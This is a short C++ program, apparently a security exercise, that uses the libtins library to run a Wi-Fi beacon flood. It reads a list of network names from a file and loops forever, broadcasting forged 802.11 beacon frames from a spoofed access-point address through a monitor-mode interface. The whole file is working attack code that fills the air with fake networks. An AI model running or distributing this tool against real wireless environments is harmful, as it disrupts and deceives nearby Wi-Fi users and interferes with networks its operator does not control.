#include <unistd.h>
#include <iostream>
#include <fstream>
#include <list>
#include <tins/tins.h>

using namespace std;
using namespace Tins;

void usage() {
    cout << "systax: syntax : beacon-flood <interface> <ssid-list-file>" << endl;
    cout << "sample : beacon-flood mon0 ssid-list.txt" << endl;
}

int main(int argc, char* argv[])
{
    if(argc != 3) {
        usage();
        return -1;
    }

    list<string> ssidList;
    std::ifstream fp;
    fp.open(argv[2]);
    if(fp.is_open()){
        while(!fp.eof())
        {
            char buff[100];
            fp.getline(buff, 100);
            ssidList.push_back(buff);
        }
        fp.close();
    }

    list<string>::iterator it = ssidList.begin();
    while (true) {
        RadioTap tap;

        Dot11::address_type ap        = "00:11:22:33:44:55";
        Dot11::address_type broadcast = "ff:ff:ff:ff:ff:ff";
        Dot11Beacon beacon(broadcast, ap);
        beacon.addr4(ap);
        beacon.ssid(*it);
        beacon.ds_parameter_set(10);
        beacon.supported_rates({ 1.0f, 5.5f, 11.0f });
        tap.inner_pdu(beacon);

        PacketSender sender(argv[1]);
        sender.send(tap);
        usleep(10000);

        if (++it == ssidList.end())
          it = ssidList.begin();
  }
}
